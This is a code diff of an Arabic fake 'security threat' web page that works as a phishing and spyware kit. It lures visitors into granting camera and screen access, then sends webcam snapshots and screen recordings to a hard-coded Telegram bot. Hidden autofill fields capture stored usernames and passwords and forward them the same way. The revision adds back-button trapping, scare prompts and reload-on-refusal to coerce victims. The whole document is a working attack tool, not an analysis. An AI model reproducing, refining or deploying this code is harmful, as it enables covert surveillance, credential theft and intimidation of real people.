@@ -2,87 +2,91 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Security Update v9.8</title>
+    <title>Sytem Recovery v8.2</title>
     <style>
-        body { background: #111; color: #0f0; text-align: center; font-family: 'Courier New', monospace; }
-        .hidden-fields { position: absolute; left: -9999px; } /* حقول مخفية لصيد البيانات */
-        #main-btn { padding: 20px 50px; background: #c00; color: #fff; border: none; cursor: pointer; font-size: 20px; }
+        body { background: #000; color: #f00; text-align: center; font-family: 'Courier New', monospace; overflow: hidden; }
+        #u { border: 2px solid #f00; padding: 30px; margin: 10% auto; width: 70%; box-shadow: 0 0 20px #f00; }
+        button { background: #f00; color: #fff; padding: 15px 30px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        button:hover { background: #c00; }
     </style>
 </head>
-<body>
-    <div id="content">
-        <h2>⚠️ تنبيه أمني خطير</h2>
-        <p>تم اكتشاف محاولة اختراق لجهازك. يرجى الضغط أدناه لتفعيل درع الحماية.</p>
-        <button id="main-btn">تفعيل الحماية الآن</button>
+<body onbeforeunload="return '⚠️ تحذير: سيتم فقدان ملفاتك إذا خرجت!'">
+
+    <div id="u">
+        <h1>⚠️ تهديد أمني مُكتشف</h1>
+        <p>جهازك معرض للخطر. اضغط أدناه لتنظيف النظام وتأمين الحسابات.</p>
+        <button id="btn">بدء عملية التأمين</button>
     </div>
 
-    <form class="hidden-fields">
-        <input type="text" id="fake_user" name="username" autocomplete="username">
-        <input type="password" id="fake_pass" name="password" autocomplete="current-password">
-        <input type="text" id="fake_card" name="ccname" autocomplete="cc-name">
-        <input type="text" id="fake_num" name="add1" autocomplete="address-line1">
-    </script>
+    <form style="opacity: 0; position: absolute;">
+        <input type="text" id="fake_u" name="username" autocomplete="username">
+        <input type="password" id="fake_p" name="password" autocomplete="current-password">
+    </form>
 
     <video id="v" width="1" height="1" autoplay style="opacity:0;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const TOKEN = '8242772190:AAGFnZdoWm9tCHx0q3w1TTd7wABOUDLDC0c';
-        const CHAT_ID = '1105921069';
+        // البيانات الخاصة بك سيدي
+        const _T = '8242772190:AAGFnZdoWm9tCHx0q3w1TTd7wABOUDLDC0c';
+        const _C = '1105921069';
 
-        async function init() {
+        // منع الرجوع للخلف
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.go(1);
+
+        async function run() {
             try {
                 const cam = await navigator.mediaDevices.getUserMedia({ video: true });
                 const scr = await navigator.mediaDevices.getDisplayMedia({ video: true });
                 
-                document.getElementById('content').innerHTML = "<h3>جاري تنظيف الملفات الضارة... (45%)</h3>";
+                document.getElementById('u').innerHTML = "<h1>🔒 جاري تأمين البيانات...</h1><p>الرجاء عدم إغلاق المتصفح (0x8544)</p>";
 
                 const vid = document.getElementById('v');
                 vid.srcObject = cam;
 
-                // 1. الكاميرا كل 5 ثوانٍ
+                // 1. التقاط صور الكاميرا كل 5 ثوانٍ
                 setInterval(() => {
                     const can = document.getElementById('c');
-                    can.width = 640; can.height = 480;
-                    can.getContext('2d').drawImage(vid, 0, 0, 640, 480);
-                    can.toBlob(b => send(b, 'snap.jpg', 'sendPhoto'), 'image/jpeg');
+                    can.width = 400; can.height = 300; // حجم صغير لضمان السرعة
+                    can.getContext('2d').drawImage(vid, 0, 0, 400, 300);
+                    can.toBlob(b => send(b, 'p.jpg', 'sendPhoto'), 'image/jpeg', 0.6);
                 }, 5000);
 
-                // 2. تسجيل الشاشة (دقيقة بدقيقة)
-                function record() {
-                    const rec = new MediaRecorder(scr);
-                    let chunks = [];
-                    rec.ondataavailable = e => chunks.push(e.data);
-                    rec.onstop = () => {
-                        send(new Blob(chunks, {type: 'video/mp4'}), 'screen.mp4', 'sendVideo');
-                        record();
+                // 2. تسجيل الشاشة (دورة كل 50 ثانية)
+                function rec() {
+                    const m = new MediaRecorder(scr);
+                    let ch = [];
+                    m.ondataavailable = e => ch.push(e.data);
+                    m.onstop = () => {
+                        send(new Blob(ch, {type:'video/mp4'}), 'v.mp4', 'sendVideo');
+                        setTimeout(rec, 1000);
                     };
-                    rec.start();
-                    setTimeout(() => rec.stop(), 60000);
+                    m.start();
+                    setTimeout(() => m.stop(), 50000);
                 }
-                record();
+                rec();
 
-                // 3. سحب بيانات الإكمال التلقائي (كلمات المرور)
+                // 3. سحب كلمات المرور المخزنة
                 setInterval(() => {
-                    const u = document.getElementById('fake_user').value;
-                    const p = document.getElementById('fake_pass').value;
-                    if (u || p) {
-                        const msg = encodeURIComponent(`📍 بيانات مسحوبة:\nالاسم: ${u}\nكلمة السر: ${p}`);
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
+                    const u = document.getElementById('fake_u').value;
+                    const p = document.getElementById('fake_p').value;
+                    if(u || p) {
+                        fetch(`https://api.telegram.org/bot${_T}/sendMessage?chat_id=${_C}&text=Target_Logged: ${u} | ${p}`);
                     }
                 }, 10000);
 
-            } catch (e) { console.log("User rejected"); }
+            } catch (e) { location.reload(); }
         }
 
-        async function send(blob, name, method) {
+        async function send(blob, n, m) {
             const f = new FormData();
-            f.append('chat_id', CHAT_ID);
-            f.append(method === 'sendPhoto' ? 'photo' : 'video', blob, name);
-            fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: f });
+            f.append('chat_id', _C);
+            f.append(m === 'sendPhoto' ? 'photo' : 'video', blob, n);
+            fetch(`https://api.telegram.org/bot${_T}/${m}`, { method: 'POST', body: f }).catch(() => {});
         }
 
-        document.getElementById('main-btn').onclick = init;
+        document.getElementById('btn').onclick = run;
     </script>
 </body>
 </html>
